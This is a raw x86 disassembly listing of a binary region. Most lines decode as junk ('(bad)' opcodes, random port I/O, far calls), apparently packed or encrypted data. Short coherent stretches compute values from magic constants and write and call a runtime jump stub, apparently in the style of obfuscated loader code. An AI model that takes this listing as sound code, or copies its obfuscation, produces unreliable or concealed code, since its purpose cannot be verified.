  410112:	mov    ecx,0x84230e53
  410117:	mov    al,ds:0x42692245
  41011c:	push   ebp
  41011d:	leave  
  41011e:	mov    ecx,0xc6a31a21
  410123:	aam    0xb1
  410125:	sahf   
  410126:	xor    al,0x4d
  410128:	(bad)  
  410129:	pop    edx
  41012a:	cli    
  41012b:	cli    
  41012c:	add    eax,0xace37749
  410131:	(bad)  
  410132:	jbe    0x4100fc
  410134:	adc    eax,0x7f15ab03
  410139:	bnd ret 0xe2c6
  41013d:	mov    ds:0x31d908f7,al
  410142:	pop    ecx
  410143:	jmp    FWORD PTR [ebp+0x49]
  410146:	cwde   
  410147:	dec    ebp
  410148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410149:	into   
  41014a:	mov    dl,BYTE PTR [edx]
  41014c:	mov    bl,0xa5
  41014e:	xchg   edi,eax
  41014f:	nop
  410150:	xchg   ecx,eax
  410151:	aam    0x63
  410153:	in     al,0x35
  410155:	add    esi,DWORD PTR [eax+0x29]
  410158:	push   esi
  410159:	pushf  
  41015a:	xchg   ebx,eax
  41015b:	aam    0xec
  41015d:	(bad)  
  41015e:	push   0xffffffea
  410160:	in     al,dx
  410161:	jmp    0xda0c111c
  410166:	pop    ebx
  410167:	xor    DWORD PTR [ebx+0x368c7646],eax
  41016d:	jge    0x410111
  41016f:	or     DWORD PTR [ebx],edi
  410171:	in     al,dx
  410172:	xor    BYTE PTR [ebp+0x76],ah
  410175:	xor    dh,BYTE PTR [esi]
  410177:	sbb    cl,BYTE PTR [edx+edi*1-0x37]
  41017b:	add    al,0xc9
  41017d:	aas    
  41017e:	inc    esp
  41017f:	xchg   esi,eax
  410180:	rol    DWORD PTR [esi-0x2],cl
  410183:	dec    edx
  410184:	mov    ds:0x5763158c,eax
  410189:	aas    
  41018a:	cwde   
  41018b:	pop    ds
  41018c:	push   esi
  41018d:	stc    
  41018e:	mov    bl,BYTE PTR [edx-0x438acbf6]
  410194:	imul   edx,DWORD PTR [edx-0x273a9e0b],0xa56d79
  41019e:	mov    ds:0xef41afb7,al
  4101a3:	add    al,0x70
  4101a5:	or     al,0x27
  4101a7:	adc    esp,esi
  4101a9:	mov    dl,0x64
  4101ab:	xchg   al,al
  4101ad:	fnstcw WORD PTR [esi-0x79c09919]
  4101b3:	ficom  WORD PTR [ebx]
  4101b5:	add    edx,esi
  4101b7:	xor    dh,bl
  4101b9:	mov    dh,0x76
  4101bb:	mov    esi,0x1ba0a099
  4101c0:	lds    esi,FWORD PTR [ebp+0x7434ab5e]
  4101c6:	shl    esi,1
  4101c8:	inc    esp
  4101c9:	call   0xfab56763
  4101ce:	mov    ds:0xd28e83c8,eax
  4101d3:	sbb    eax,0xf3c20563
  4101d8:	push   0x58de7919
  4101dd:	push   es
  4101de:	sbb    esi,0x9e92510b
  4101e4:	out    0x64,eax
  4101e6:	mov    bl,0x42
  4101e8:	adc    ecx,edx
  4101ea:	cmp    edi,DWORD PTR [edx-0x25]
  4101ed:	inc    eax
  4101ee:	mov    esi,0x511bba58
  4101f3:	lods   al,BYTE PTR ds:[esi]
  4101f4:	xchg   ecx,eax
  4101f5:	jp     0x410193
  4101f7:	scas   eax,DWORD PTR es:[edi]
  4101f8:	neg    edi
  4101fa:	scas   eax,DWORD PTR es:[edi]
  4101fb:	mov    ah,0x42
  4101fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101ff:	cmp    ch,BYTE PTR [ebp+0x37fc89d9]
  410205:	adc    al,0x1f
  410207:	jecxz  0x4101b9
  410209:	xchg   edx,eax
  41020a:	inc    ecx
  41020b:	std    
  41020c:	jno    0x4101f9
  41020e:	pusha  
  41020f:	jg     0x410210
  410211:	stos   BYTE PTR es:[edi],al
  410212:	cmp    DWORD PTR [ecx],esi
  410214:	loopne 0x410248
  410216:	rol    DWORD PTR [ebp-0x365ce826],1
  41021c:	pushf  
  41021d:	shr    edi,cl
  41021f:	(bad)  
  410220:	jno    0x410228
  410222:	js     0x410216
  410224:	jne    0x41065f
  41022a:	mov    ecx,DWORD PTR [ebp-0x78]
  41022d:	xor    edx,edx
  41022f:	mov    eax,0x209c
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x4225b8
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x4225b8
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x4226c0
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x4226b8],eax
  4102bc:	inc    DWORD PTR ds:0x4226c0
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	sbb    al,0xe6
  41030e:	sbb    BYTE PTR [edx+0x181892c3],ch
  410314:	mov    esi,0x71181814
  410319:	adc    BYTE PTR es:[ecx],ch
  41031c:	mov    ds:0x73098430,eax
  410321:	sub    eax,0xb4e28a89
  410326:	dec    edi
  410327:	out    dx,eax
  410328:	push   esp
  410329:	jns    0x4102f9
  41032b:	mov    esp,0x63458510
  410330:	lods   al,BYTE PTR ds:[esi]
  410331:	push   0xb1c62123
  410336:	sub    esp,DWORD PTR [ebx]
  410338:	cmp    cl,BYTE PTR [ebx]
  41033a:	push   ebx
  41033b:	(bad)  
  41033c:	enter  0xb2a3,0xb6
  410340:	dec    esp
  410341:	inc    DWORD PTR [ebx]
  410343:	mov    ecx,0x3a99a553
  410348:	xor    ebp,DWORD PTR [esi-0x27932910]
  41034e:	pusha  
  41034f:	(bad)  
  410350:	frstor ds:0x3cb3a6e7
  410356:	xchg   BYTE PTR [edx-0x1b],cl
  410359:	jnp    0x4103a6
  41035b:	pop    esp
  41035c:	jo     0x410354
  41035e:	idiv   DWORD PTR ds:0xcd794717
  410364:	mov    fs,WORD PTR [ebp+ebx*4+0x31c08290]
  41036b:	mov    edi,0xba995bf0
  410370:	ja     0x4103c9
  410372:	and    esp,edi
  410374:	popf   
  410375:	scas   al,BYTE PTR es:[edi]
  410376:	pop    ss
  410377:	js     0x41037d
  410379:	inc    esp
  41037a:	gs mov esp,0x70ee91a0
  410380:	mov    cl,0xc3
  410382:	sub    bh,0x9e
  410385:	adc    eax,0xb0c4f1db
  41038a:	and    DWORD PTR [edi-0x6d],ebp
  41038d:	push   edi
  41038e:	stos   BYTE PTR es:[edi],al
  41038f:	fwait
  410390:	lahf   
  410391:	test   DWORD PTR [esi+0x1a9b1e02],edx
  410397:	mov    ds:0x464b2aae,eax
  41039c:	pop    ss
  41039d:	inc    ebx
  41039e:	iret   
  41039f:	sti    
  4103a0:	stos   BYTE PTR es:[edi],al
  4103a1:	stos   BYTE PTR es:[edi],al
  4103a2:	loop   0x4103cb
  4103a4:	and    al,0xd5
  4103a6:	pop    ebp
  4103a7:	cld    
  4103a8:	add    dl,cl
  4103aa:	jnp    0x41037c
  4103ac:	jns    0x41036b
  4103ae:	out    dx,eax
  4103af:	xchg   ebx,eax
  4103b0:	push   esp
  4103b1:	mov    edi,DWORD PTR [esp+ebx*4]
  4103b4:	pop    ebx
  4103b5:	push   cs
  4103b6:	fadd   st(5),st
  4103b8:	lock add al,0xdd
  4103bb:	mov    eax,0xacefef06
  4103c0:	jl     0x410389
  4103c2:	mov    ebx,0xd8639164
  4103c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103c8:	add    BYTE PTR [esi],dh
  4103ca:	pop    edi
  4103cb:	js     0x410429
  4103cd:	sub    bh,bl
  4103cf:	nop
  4103d0:	into   
  4103d1:	leave  
  4103d2:	pop    edi
  4103d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103d4:	inc    edx
  4103d5:	lds    edx,FWORD PTR [eax+0x7a]
  4103d8:	mov    edi,?
  4103da:	inc    DWORD PTR [edi]
  4103dc:	cli    
  4103dd:	add    edx,0x42e857f1
  4103e3:	push   es
  4103e4:	jno    0x4103cf
  4103e6:	test   eax,0x1d4d3aa3
  4103eb:	(bad)  
  4103ec:	dec    esp
  4103ed:	push   ebx
  4103ee:	(bad)  [eax+0x3d]
  4103f1:	mov    ch,0x35
  4103f3:	xchg   esp,eax
  4103f4:	add    DWORD PTR [edx-0x12],0xffffff81
  4103f8:	sub    BYTE PTR [esp+edx*1+0x58f98dae],dh
  4103ff:	jb     0x4103db
  410401:	adc    ebx,DWORD PTR [eax-0x2439b8ce]
  410407:	inc    edx
  410408:	add    esi,DWORD PTR [edx-0x1c32a5e2]
  41040e:	sub    DWORD PTR [edx-0x11],eax
  410411:	ins    DWORD PTR es:[edi],dx
  410412:	rcl    BYTE PTR [edi-0x337fd1ef],cl
  410418:	repz cmp eax,0xa9e652e5
  41041e:	cs gs mov ebx,0xd4ad7428
  410425:	inc    edx
  410426:	les    esp,FWORD PTR [ebx+eiz*1]
  410429:	sub    eax,0x7a82992a
  41042e:	inc    esp
  41042f:	xchg   ebx,eax
  410430:	gs test eax,0x7bbb2777
  410436:	xor    al,0x21
  410438:	hlt    
  410439:	call   0x2033:0x9768d990
  410440:	(bad)  
  410442:	nop
  410443:	adc    DWORD PTR ds:0x26f6cedb,ebp
  410449:	sbb    BYTE PTR [edx+0x4fcaa74b],bh
  41044f:	in     eax,0xac
  410451:	inc    ebx
  410452:	mov    al,0x36
  410454:	loope  0x410490
  410456:	ins    BYTE PTR es:[edi],dx
  410457:	mov    bl,0x60
  410459:	mov    DWORD PTR [edx-0x2f],0x57418d57
  410460:	fcom   QWORD PTR [ebx-0x6b317d77]
  410466:	pop    es
  410467:	sahf   
  410468:	xchg   ebp,eax
  410469:	ins    BYTE PTR es:[edi],dx
  41046a:	cmp    BYTE PTR [ebx],cl
  41046c:	loopne 0x41042b
  41046e:	clc    
  41046f:	mov    dl,0xd
  410471:	scas   al,BYTE PTR es:[edi]
  410472:	mov    WORD PTR [edi],fs
  410474:	stos   BYTE PTR es:[edi],al
  410475:	mov    bl,0x81
  410477:	pxor   mm0,QWORD PTR [edi-0x4190d2c6]
  41047e:	pop    es
  41047f:	cmp    BYTE PTR [edx],0x50
  410482:	push   es
  410483:	lods   al,BYTE PTR ds:[esi]
  410484:	inc    esi
  410485:	inc    edx
  410486:	hlt    
  410487:	jo     0x41042f
  410489:	frstor [eax+0x7ebbc98a]
  41048f:	fsubr  QWORD PTR [ebx]
  410491:	mov    ebp,esi
  410493:	jge    0x410441
  410495:	xchg   esp,eax
  410496:	(bad)  
  410497:	sahf   
  410498:	push   es
  410499:	jnp    0x410506
  41049b:	loope  0x4104df
  41049d:	jnp    0x4104e4
  41049f:	clc    
  4104a0:	mov    edi,0xbc8d67dc
  4104a5:	mov    ds,WORD PTR [ecx+edi*4-0x40889941]
  4104ac:	hlt    
  4104ad:	jbe    0x410465
  4104af:	sti    
  4104b0:	dec    esp
  4104b1:	pop    ds
  4104b2:	sub    DWORD PTR [ebp+0x47],0x55
  4104b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104b7:	mov    al,ds:0x7866c588
  4104bc:	and    ch,BYTE PTR [ebx]
  4104be:	mov    ?,ebp
  4104c0:	xor    eax,0x1c70ba31
  4104c5:	add    eax,0x8ac25356
  4104ca:	push   DWORD PTR [ebx]
  4104cc:	ins    DWORD PTR es:[edi],dx
  4104cd:	sbb    DWORD PTR ds:0xc1005ec3,esp
  4104d3:	jmp    0xadd5cab0
  4104d8:	arpl   WORD PTR [ebx],cx
  4104da:	adc    al,cl
  4104dc:	add    esi,DWORD PTR [eax-0x4d]
  4104df:	mov    ch,0x17
  4104e1:	add    bl,al
  4104e3:	in     al,dx
  4104e4:	sbb    al,0x23
  4104e6:	shl    ah,0xb8
  4104e9:	mov    bh,0xba
  4104eb:	adc    DWORD PTR [ecx],eax
  4104ed:	sbb    DWORD PTR [ebp+0x1c4abad8],ebx
  4104f3:	fld    QWORD PTR [eax-0x1abdf80d]
  4104f9:	cwde   
  4104fa:	or     ebx,edx
  4104fc:	and    bh,BYTE PTR [ebx]
  4104fe:	mov    ch,0x26
  410500:	(bad)  
  410502:	push   ebp
  410503:	popf   
  410504:	iret   
  410505:	shr    BYTE PTR [edi+0x76287ffd],cl
  41050b:	stos   BYTE PTR es:[edi],al
  41050c:	call   0xb3879b33
  410511:	lods   al,BYTE PTR ds:[esi]
  410512:	cs pop edx
  410514:	in     al,dx
  410515:	and    ch,BYTE PTR [ebp-0x41]
  410518:	inc    edx
  410519:	dec    ebx
  41051a:	inc    esi
  41051b:	dec    ebp
  41051c:	in     al,0x8b
  41051e:	and    ebx,DWORD PTR [eax-0x4acf7603]
  410524:	daa    
  410525:	call   0x3e72630c
  41052a:	mov    edi,0x371cf613
  41052f:	aad    0xbc
  410531:	mov    WORD PTR [eax+0x1b],ds
  410534:	call   0xd1fc:0x81507999
  41053b:	imul   ebp,DWORD PTR [ebp+0x27e7a9b9],0xffffffd2
  410542:	icebp  
  410543:	pusha  
  410544:	div    BYTE PTR [edi]
  410546:	mov    ds:0x6d141023,al
  41054b:	or     edi,DWORD PTR [edx-0x2b]
  41054e:	das    
  41054f:	add    esi,esi
  410551:	mov    bh,0xf2
  410553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410554:	hlt    
  410555:	adc    al,0x4a
  410557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410558:	mov    WORD PTR [ebp+edi*8+0x1a],?
  41055c:	std    
  41055d:	xchg   esi,eax
  41055e:	into   
  41055f:	outs   dx,BYTE PTR ds:[esi]
  410560:	cmp    al,0xc3
  410562:	sbb    BYTE PTR [ecx],dl
  410564:	mov    esp,0x93241233
  410569:	fnsetpm(287 only) 
  41056b:	xor    eax,0x6bb4d2e8
  410570:	xchg   DWORD PTR [ebx],esp
  410572:	mov    edx,0x94fe2006
  410577:	es enter 0xe54,0xcd
  41057c:	cwde   
  41057d:	push   esi
  41057e:	in     al,dx
  41057f:	fisttp WORD PTR [esi+0x5a76eab7]
  410585:	cmp    al,0x52
  410587:	fsub   DWORD PTR [ebx+0x78]
  41058a:	mov    eax,DWORD PTR [edx+0x31328465]
  410590:	push   ebp
  410591:	mov    ?,ebx
  410593:	rcr    esi,cl
  410595:	in     al,0xf9
  410597:	shl    BYTE PTR [ebx],cl
  410599:	cs sub eax,0x8c5aba18
  41059f:	dec    ebp
  4105a0:	ss inc ebx
  4105a2:	xor    ebx,DWORD PTR [ecx-0x51]
  4105a5:	push   cs
  4105a6:	mov    bl,0x97
  4105a8:	call   0x4beb:0x79c277ee
  4105af:	inc    eax
  4105b0:	pop    eax
  4105b1:	and    BYTE PTR ds:0x5227b56e,bh
  4105b7:	adc    al,0xb7
  4105b9:	cli    
  4105ba:	std    
  4105bb:	xchg   DWORD PTR [ecx-0x16],esp
  4105be:	or     eax,0xb48a35ea
  4105c3:	lahf   
  4105c4:	mov    esi,0xe8c80497
  4105c9:	lea    eax,[ebp-0x10]
  4105cc:	mov    DWORD PTR [ebp-0x9c],eax
  4105d2:	mov    eax,DWORD PTR [ebp-0x54]
  4105d5:	mov    DWORD PTR [ebp-0x10],eax
  4105d8:	mov    eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x422434
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x4226a8
  410612:	push   DWORD PTR ds:0x42243c
  410618:	push   DWORD PTR ds:0x422688
  41061e:	push   DWORD PTR ds:0x4226fc
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x4225b8
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	sbb    eax,0x687edf4d
  4106f1:	mov    ds,WORD PTR [eax]
  4106f3:	sbb    BYTE PTR [edx+0x6f181814],bl
  4106f9:	or     dh,BYTE PTR [ebx]
  4106fb:	stc    
  4106fc:	call   0xfa94:0x100bd4fb
  410703:	xchg   BYTE PTR [ebx-0x561a8118],dl
  410709:	mov    ebp,0xf019d117
  41070e:	jns    0x4106af
  410710:	mov    cs,esi
  410712:	add    dl,BYTE PTR [eax]
  410714:	je     0x410794
  410716:	in     eax,0x2c
  410718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410719:	adc    edx,DWORD PTR [ebx+0x6a51c16a]
  41071f:	(bad)  
  410721:	add    eax,0xa71ab05d
  410726:	or     al,0x46
  410728:	inc    ebp
  410729:	dec    edx
  41072a:	aam    0x28
  41072c:	test   BYTE PTR [ecx],0x26
  41072f:	add    ecx,DWORD PTR [edi-0x23209b15]
  410735:	ret    
  410736:	imul   edi,DWORD PTR [ebp+0x7bb00b2b],0xfffffff0
  41073d:	sbb    eax,0x1e8e27db
  410742:	call   0x7a4b:0x1c9437d0
  410749:	loop   0x410752
  41074b:	cli    
  41074c:	pop    edx
  41074d:	shr    DWORD PTR [esi-0x7d],cl
  410750:	ins    DWORD PTR es:[edi],dx
  410751:	mov    al,ds:0x8dfe93a5
  410756:	sub    DWORD PTR [eax+edi*4+0x49],esi
  41075a:	shr    al,0x8e
  41075d:	js     0x4107a3
  41075f:	outs   dx,DWORD PTR ds:[esi]
  410760:	jns    0x41074e
  410762:	ds xchg esp,eax
  410764:	xchg   ecx,eax
  410765:	push   esi
  410766:	iret   
  410767:	pop    es
  410768:	sti    
  410769:	mov    ebx,DWORD PTR [ecx+0x2c]
  41076c:	(bad)  
  41076d:	jmp    0x410776
  41076f:	cmp    DWORD PTR [ebx-0x1e8a4199],ebp
  410775:	jmp    0x9104a450
  41077a:	adc    BYTE PTR [ebx-0xf],0x68
  41077e:	ret    0xec4d
  410781:	fucomip st,st(5)
  410783:	nop
  410784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410785:	pop    ebx
  410786:	mov    ecx,0x317d8503
  41078b:	xor    eax,0x120f4bf1
  410790:	jb     0x410738
  410792:	sub    eax,DWORD PTR [edx]
  410794:	ins    DWORD PTR es:[edi],dx
  410795:	adc    bl,BYTE PTR [ebp+0x3c]
  410798:	mov    dh,0x70
  41079a:	or     eax,0xa2cc2e4d
  41079f:	adc    bl,0xb8
  4107a2:	xlat   BYTE PTR ds:[ebx]
  4107a3:	scas   al,BYTE PTR es:[edi]
  4107a4:	add    al,0xda
  4107a6:	xchg   ecx,eax
  4107a7:	pop    esi
  4107a8:	jmp    0x255fc6ef
  4107ad:	mov    dl,0xd1
  4107af:	std    
  4107b0:	sub    al,BYTE PTR [esi-0x24ee8eea]
  4107b6:	jmp    0x4107d8
  4107b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107b9:	push   ebp
  4107ba:	call   0xa11479ff
  4107bf:	mov    ebx,0x8d6147a6
  4107c4:	outs   dx,DWORD PTR ds:[esi]
  4107c5:	aad    0x3d
  4107c7:	(bad)  
  4107c9:	cmp    edx,DWORD PTR [ebx+0x32d19473]
  4107cf:	jbe    0x410826
  4107d1:	xor    ebx,esp
  4107d3:	mov    edx,0x52c8e490
  4107d8:	cwde   
  4107d9:	test   DWORD PTR [esi],eax
  4107db:	cld    
  4107dc:	sbb    eax,0xd69c3026
  4107e1:	test   ebp,ebx
  4107e3:	(bad)  
  4107e4:	inc    ebp
  4107e5:	and    cl,BYTE PTR [edx]
  4107e7:	pop    ebx
  4107e8:	out    dx,al
  4107e9:	sbb    eax,0x1e6fd6e7
  4107ee:	out    dx,al
  4107ef:	shl    BYTE PTR [edi+0x714a1d2b],1
  4107f5:	fcmovnbe st,st(6)
  4107f7:	mov    ds:0xa1afd800,eax
  4107fc:	bound  ebx,QWORD PTR [edx+0x43]
  4107ff:	xor    BYTE PTR [ebx+edx*8-0x66],dh
  410803:	lahf   
  410804:	es mov bl,0xc2
  410807:	xchg   DWORD PTR [edx-0x2],ebp
  41080a:	popf   
  41080b:	je     0x4107f5
  41080d:	mov    ah,0x7d
  41080f:	ins    DWORD PTR es:[edi],dx
  410810:	push   ebx
  410811:	(bad)  [ebp-0x71]
  410814:	lds    edi,FWORD PTR [eax+edi*4]
  410817:	xchg   ecx,eax
  410818:	ret    
  410819:	xchg   edx,eax
  41081a:	rol    esi,0xe8
  41081d:	into   
  41081e:	and    al,0xef
  410820:	fmul   DWORD PTR [ebx]
  410822:	pop    ecx
  410823:	das    
  410824:	mov    dh,0x1c
  410826:	scas   eax,DWORD PTR es:[edi]
  410827:	jae    0x410890
  410829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41082a:	ins    DWORD PTR es:[edi],dx
  41082b:	out    dx,al
  41082c:	or     dh,BYTE PTR [edx+0x43023a56]
  410832:	adc    edx,edx
  410834:	dec    edx
  410835:	lods   eax,DWORD PTR ds:[esi]
  410836:	gs in  al,dx
  410838:	push   edx
  410839:	rol    DWORD PTR [ebx],cl
  41083b:	stos   DWORD PTR es:[edi],eax
  41083c:	cli    
  41083d:	outs   dx,BYTE PTR ds:[esi]
  41083e:	call   0xd3ebca53
  410843:	jge    0x41086c
  410845:	push   ebx
  410846:	rcl    BYTE PTR [ebx+ecx*1-0x12bc150],cl
  41084d:	mov    eax,DWORD PTR [esp+edi*8+0x44]
  410851:	les    ecx,FWORD PTR [ecx-0x26]
  410854:	xchg   edi,eax
  410855:	or     edx,ebx
  410857:	out    0x44,eax
  410859:	loopne 0x4107f8
  41085b:	lods   al,BYTE PTR ds:[esi]
  41085c:	sahf   
  41085d:	mov    cl,ch
  41085f:	inc    ebp
  410860:	xchg   ebx,eax
  410861:	xchg   ecx,eax
  410862:	(bad)  
  410864:	xlat   BYTE PTR ds:[ebx]
  410865:	xor    esp,DWORD PTR [esi+ecx*8]
  410868:	dec    eax
  410869:	mov    ebp,0xee06d705
  41086e:	mov    dh,0x25
  410870:	scas   al,BYTE PTR es:[edi]
  410871:	xchg   esi,eax
  410872:	mov    edx,0x65d52ade
  410877:	inc    eax
  410878:	push   0x138869f1
  41087d:	mov    ch,ch
  41087f:	(bad)
  410883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410884:	jb     0x4108e8
  410886:	in     eax,0x48
  410888:	jo     0x41082e
  41088a:	in     eax,dx
  41088b:	jmp    0x4174:0x6f16b658
  410892:	push   esi
  410893:	lea    eax,[ecx+eax*4+0x33]
  410897:	or     esi,ebp
  410899:	fadd   DWORD PTR [edi-0x3cd224e0]
  41089f:	dec    eax
  4108a0:	(bad)  
  4108a1:	repz int3 
  4108a3:	ret    
  4108a4:	test   eax,0xaea0084
  4108a9:	in     eax,dx
  4108aa:	into   
  4108ab:	xchg   edi,eax
  4108ac:	adc    BYTE PTR cs:[eax+0x42],ah
  4108b0:	pop    eax
  4108b1:	or     ebx,DWORD PTR [ebp-0x4271a84d]
  4108b7:	sub    eax,0xc2dde1ed
  4108bc:	push   0x59
  4108be:	inc    ebp
  4108bf:	xor    dh,BYTE PTR [edi-0x36de0c56]
  4108c5:	pushf  
  4108c6:	ror    BYTE PTR [ecx+0x15],cl
  4108c9:	and    esp,DWORD PTR [ecx-0x74]
  4108cc:	adc    ah,dl
  4108ce:	jnp    0x41091d
  4108d0:	lea    esi,[ecx]
  4108d2:	or     al,0x7
  4108d4:	dec    esi
  4108d5:	std    
  4108d6:	(bad)  
  4108d7:	je     0x4108cb
  4108d9:	dec    eax
  4108da:	dec    ecx
  4108db:	in     al,dx
  4108dc:	daa    
  4108dd:	and    eax,0xb6f8ca89
  4108e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108e3:	pop    ebp
  4108e4:	data16 jbe 0x41089a
  4108e7:	push   0xffffff9d
  4108e9:	add    al,BYTE PTR [edi-0xa6b879c]
  4108ef:	inc    ebx
  4108f0:	mov    WORD PTR [edi-0x7e],gs
  4108f3:	jne    0x410973
  4108f5:	leave  
  4108f6:	ficomp WORD PTR [ebx-0x55c320e6]
  4108fc:	pushf  
  4108fd:	adc    ah,ch
  4108ff:	jg     0x41091c
  410901:	push   esi
  410902:	add    eax,0x2866d724
  410907:	aaa    
  410908:	add    cl,0x3e
  41090b:	jne    0x410915
  41090d:	je     0x4108e9
  41090f:	call   DWORD PTR [edi]
  410911:	xlat   BYTE PTR ds:[ebx]
  410912:	add    al,0xcf
  410914:	and    DWORD PTR [ebp+0x4b],esp
  410917:	ret    
  410918:	dec    ebx
  410919:	icebp  
  41091a:	mov    bl,0x8
  41091c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41091d:	cli    
  41091e:	mov    bl,0x6a
  410920:	(bad)  
  410921:	pop    esi
  410922:	shr    edx,1
  410924:	icebp  
  410925:	mov    ebp,0xe9d4da7a
  41092a:	int3   
  41092b:	jb     0x41092a
  41092d:	sbb    ch,dl
  41092f:	sbb    BYTE PTR [ecx+0x40d390b4],dh
  410935:	xchg   ebp,eax
  410936:	mov    bh,0xe4
  410938:	neg    BYTE PTR [ebx+0x28]
  41093b:	mov    cl,0x9e
  41093d:	sbb    BYTE PTR [ebp-0x18],0x12
  410941:	imul   eax,DWORD PTR [ebx+esi*8-0x1c],0xcd1b0b5e
  410949:	clc    
  41094a:	das    
  41094b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
